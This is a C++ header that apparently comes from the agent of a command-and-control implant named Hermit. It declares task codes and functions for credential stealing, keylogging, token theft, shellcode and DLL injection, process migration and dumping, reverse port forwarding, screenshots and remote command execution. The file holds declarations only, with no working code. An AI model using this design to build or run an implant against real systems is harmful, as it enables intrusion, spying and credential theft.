#ifndef HERMIT_CORE_TASK_HPP
#define HERMIT_CORE_TASK_HPP

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <winreg.h>
#include <winternl.h>
#include <dbghelp.h>
#include <gdiplus.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <synchapi.h>
#include <tlhelp32.h>
#include <chrono>
#include <map>
#include <string>
#include <vector>

#include "core/macros.hpp"
#include "core/state.hpp"
#include "core/stdout.hpp"
#include "core/system.hpp"
#include "core/technique.hpp"
#include "core/utils.hpp"

// For the 'ip' task
#define MAX_TRIES 3
#define WORKING_BUFFER_SIZE 15000
// For the 'reg' task
#define BUFFER_SIZE 8192
#define MAX_REG_KEY_LENGTH 255
// For the 'screenshot' task
#define IDS_APP_TITLE 1
#define IDC_GDICAPTURINGANIMAGE 1
#define IDI_GDICAPTURINGANIMAGE 2
#define IDI_SMALL 3

#define TASK_CAT                0x01
#define TASK_CD                 0x02
#define TASK_CONNECT            0x03
#define TASK_CP                 0x04
#define TASK_CREDS_STEAL        0x05
#define TASK_DLL                0x06
#define TASK_DOWNLOAD           0x07
#define TASK_ENV_LS             0x08
#define TASK_EXECUTE            0x09
#define TASK_GROUP_LS           0x10
#define TASK_HISTORY            0x11
#define TASK_IP                 0x12
#define TASK_JITTER             0x13
#define TASK_KEYLOG             0x14
#define TASK_KILL               0x15
#define TASK_KILLDATE           0x16
#define TASK_LS                 0x17
#define TASK_MIGRATE            0x18
#define TASK_MKDIR              0x19
#define TASK_MV                 0x20
#define TASK_NET                0x21
#define TASK_PROCDUMP           0x22
#define TASK_PS_KILL            0x23
#define TASK_PS_LS              0x24
#define TASK_PWD                0x25
#define TASK_REG_SUBKEYS        0x26
#define TASK_REG_VALUES         0x27
#define TASK_RM                 0x28
#define TASK_RMDIR              0x29
#define TASK_RPORTFWD_ADD       0x30
#define TASK_RPORTFWD_LS        0x31
#define TASK_RPORTFWD_RM        0x32
#define TASK_RUNAS              0x33
#define TASK_SCREENSHOT         0x34
#define TASK_SHELLCODE          0x35
#define TASK_SLEEP              0x36
#define TASK_TOKEN_REVERT       0x37
#define TASK_TOKEN_STEAL        0x38
#define TASK_UPLOAD             0x39
#define TASK_USER_LS            0x40
#define TASK_WHOAMI             0x41
#define TASK_WHOAMI_PRIV        0x42

namespace Task
{
    namespace Helper::Creds
    {
        std::map<std::wstring, std::vector<std::wstring>> StealCredsFromRegistryHives(
            const std::wstring& wUserSID
        );
        std::map<std::wstring, std::vector<std::wstring>> StealCredsFromFiles(
            const std::wstring& wUserName,
            const std::wstring& wUserSID
        );
    }

    namespace Helper::KeyLog
    {
        typedef struct _MYHOOKDATA
        {
            int nType;
            HOOKPROC hkprc;
            HHOOK hhook;
        } MYHOOKDATA;
        VOID SaveKey(DWORD dwKey);
        LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lPram);
    }

    namespace Helper::Reg
    {
        HKEY GetRegRootKey(const std::wstring& wRootKey);
        std::vector<std::wstring> ListRegSubKeys(
            HKEY hRootKey,
            const std::wstring& wSubKey,
            DWORD dwOptions,
            BOOL bRecursive
        );
    }

    namespace Helper::Screenshot
    {
        BOOL InitInstance(HINSTANCE hInstance, INT nCmdShow);
        // INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
        INT GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
        BOOL BmpToPng();
        BOOL DeleteBmp();
        int CaptureAnImage(HWND hWnd);
        LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
        ATOM MyRegisterClass(HINSTANCE hInstance);
    }

    namespace Helper::Token
    {
        HANDLE GetTokenByPid(DWORD dwPid);
        BOOL CreateProcessWithStolenToken(HANDLE hToken, LPCWSTR appName);
    }

    std::wstring Cat(const std::wstring& wFilePath);
    std::wstring Cd(const std::wstring& wDestDir);
    std::wstring Connect(State::PSTATE pState, const std::wstring& wListenerURL);
    std::wstring Cp(const std::wstring& wSrc, const std::wstring& wDest);
    std::wstring CredsSteal();
    std::wstring Dll(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc);
    std::wstring Download(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
    std::wstring EnvLs();
    std::wstring Execute(const std::wstring& wCmd);
    std::wstring GroupLs();
    std::wstring History();
    std::wstring Ip();
    std::wstring JitterSet(State::PSTATE pState, const std::wstring& wJitter);
    std::wstring KeyLog(const std::wstring& wLogTime);
    std::wstring Kill(State::PSTATE pState);
    std::wstring KillDateSet(State::PSTATE pState, const std::wstring& wKillDate);
    std::wstring Ls(const std::wstring& wDir);
    std::wstring Migrate(const std::wstring& wPid);
    std::wstring Mkdir(const std::wstring& wDir);
    std::wstring Mv(const std::wstring& wSrc, const std::wstring& wDest);
    std::wstring Net();
    std::wstring Procdump(State::PSTATE pState, const std::wstring& wPid);
    std::wstring Ps();
    std::wstring PsKill(const std::wstring& wPid);
    std::wstring Pwd();
    std::wstring RegSubKeys(const std::wstring& wRootKey, const std::wstring& wSubKey, BOOL bRecursive);
    std::wstring RegValues(const std::wstring& wRootKey, const std::wstring& wSubKey, BOOL bRecursive);
    std::wstring Rm(const std::wstring& wFile);
    std::wstring Rmdir(const std::wstring& wDir);
    std::wstring RportfwdAdd(State::PSTATE pState, const std::wstring& wLIP, const std::wstring& wLPort, const std::wstring& wFwdIP, const std::wstring& wFwdPort);
    std::wstring RportfwdLs(State::PSTATE pState);
    std::wstring RportfwdRm(State::PSTATE pState);
    std::wstring RunAs(const std::wstring& wUser, const std::wstring& wPassword, const std::wstring& wCmd);
    std::wstring Screenshot(State::PSTATE pState);
    std::wstring Shellcode(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc);
    std::wstring SleepSet(State::PSTATE pState, const std::wstring& wSleep);
    std::wstring TokenRevert();
    std::wstring TokenSteal(const std::wstring& wPid, const std::wstring& wProcName, bool bLogin);
    std::wstring Upload(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
    std::wstring Users();
    std::wstring Whoami();
    std::wstring WhoamiPriv();
}

#endif // HERMIT_CORE_TASK_HPP